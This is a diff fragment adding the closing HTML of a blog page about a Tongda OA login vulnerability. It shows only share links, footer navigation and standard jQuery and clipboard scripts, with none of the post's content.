+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2020/05/22/tongda-oa/&name=通达OA任意用户登录漏洞&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2020/05/22/tongda-oa/&t=通达OA任意用户登录漏洞" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    作者
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
